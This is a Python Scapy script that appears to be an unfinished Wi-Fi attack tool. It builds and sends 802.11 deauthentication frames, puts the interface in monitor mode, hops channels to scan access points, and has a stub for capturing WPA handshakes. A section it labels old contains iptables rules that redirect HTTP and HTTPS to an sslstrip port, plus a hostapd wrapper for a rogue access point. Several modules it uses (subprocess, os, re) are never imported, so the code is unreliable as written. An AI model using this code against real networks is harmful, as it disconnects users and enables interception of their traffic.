import random
import signal
import time
from multiprocessing import Process

from scapy import *
from scapy.layers.dot11 import *
import sys

targetMAC = ""
APMAC = ""
iface = "wlx000e8e0945a9"


#Constructing DeAuth message
deauth = RadioTap()/Dot11(
            type=0, subtype=12, addr1=targetMAC, addr2=APMAC, addr3=APMAC)/Dot11Deauth(
                reason=4)

HOSTAPD_CONF = '/etc/hostapd/hostapd.conf'
HOSTAPD_DEFAULT_DRIVER = 'nl80211'
HOSTAPD_DEFAULT_HW_MODE = 'g'


def main():
    # pkt = sniff(iface=iface, prn=on_sniff, count=10)
    set_mon_mode("monitor")
    ap_scanning()
    set_mon_mode("managed")
    pass


def set_mon_mode(mode):
    bash_command("ifconfig " + iface + " down")
    bash_command("iwconfig " + iface + " mode " + mode)
    bash_command("ifconfig " + iface + " up")


def on_sniff(pkt):
    print(pkt[0].summary())


# Send a deauthentication
def deAuth():
    sendp(deauth, iface=iface)


def getHandshake(pkt, WPA_KEY):
    # We check if the packet is a WPA packet
    if pkt.hasLayer(WPA_KEY):
        # Get the layer with the WPA information
        layer = pkt.getLayer(WPA_KEY)


# Turn on or off packet/ip forwarding
def set_packet_forwarding(on):
    if on:
        byte = '1'
    else:
        byte = '0'

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
        fd.write(byte)


# Execute a bach command
def bash_command(command):
    command = command.split()
    p = subprocess.Popen(command, stdout=subprocess.PIPE)
    output, err = p.communicate()


aps = dict()


# Source: https://charlesreid1.com/wiki/Scapy/AP_Scanner
def sniff_ap(pkt):
    # Check whether this is a new unseen AP beacon/probe
    if (Dot11Beacon in pkt or Dot11ProbeResp in pkt) \
            and not pkt[Dot11].addr3 in aps:
        ssid = pkt[Dot11Elt].info
        bssid = pkt[Dot11].addr3
        channel = int(ord(pkt[Dot11Elt:3].info))
        capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\
                {Dot11ProbeResp:%Dot11ProbeResp.cap%}")

        # Check for encrypted networks
        if re.search("privacy", capability):
            enc = 'Y'
        else:
            enc = 'N'

        # Save discovered AP
        aps[pkt[Dot11].addr3] = enc

        # Display discovered AP
        print("%02d  %s  %s %s" % (int(channel), enc, bssid, ssid))


def channel_hopper():
    while True:
        try:
            channel = random.randrange(1,12)
            os.system("iw dev %s set channel %d" % (iface, channel))
            time.sleep(1)
        except KeyboardInterrupt:
            break


def signal_handler(signal, frame):
    global process

    process.terminate()
    process.join()

    print("\n-=-=-=-=-=  STATISTICS =-=-=-=-=-=-")
    print("Total APs found: %d" % len(aps))
    print("Encrypted APs  : %d" % len([ap for ap in aps if aps[ap] =='Y']))
    print("Unencrypted APs: %d" % len([ap for ap in aps if aps[ap] =='N']))

    sys.exit(0)


def ap_scanning():
    global process

    print("Scanning APs")
    print("CH ENC BSSID             SSID")

    process = Process(target=channel_hopper)
    process.start()

    # Capture CTRL-C
    signal.signal(signal.SIGINT, signal_handler)

    # Start the sniffer
    sniff(iface=iface, prn=sniff_ap)






## Unneeded OLD stuff #######




# IP Tables
class IPTables(object):

    _instance = None

    def __init__(self):
        self.running = False
        self.reset()

    @staticmethod
    # Singleton class
    def get_instance():
        if IPTables._instance is None:
            IPTables._instance = IPTables()
        return IPTables._instance

    def route_to_sslstrip(self, phys, upstream):
        bash_command('iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' % phys)

        bash_command('iptables --append FORWARD --in-interface %s -j ACCEPT' % upstream)

        bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
        bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000')

        bash_command('iptables -t nat -A POSTROUTING -j MASQUERADE')

    def reset(self):
        bash_command('iptables -P INPUT ACCEPT')
        bash_command('iptables -P FORWARD ACCEPT')
        bash_command('iptables -P OUTPUT ACCEPT')

        bash_command('iptables --flush')
        bash_command('iptables --flush -t nat')


# Wrapper for HostAPD (external service)
class HostAPD(object):

    _instance = None

    def __init__(self):
        self.running = False
        self.conf = HOSTAPD_CONF

    @staticmethod
    def get_instance():
        if HostAPD._instance is None:
            HostAPD._instance = HostAPD()
        return HostAPD._instance

    def start(self):

        if self.running:
            raise Exception('[Utils] hostapd is already running.')

        self.running = True
        bash_command('hostapd %s' % self.conf)
        time.sleep(2)

    def stop(self):

        if not self.running:
            raise Exception('[Utils] hostapd is not running.')

        bash_command('killall hostapd')
        time.sleep(2)

main()
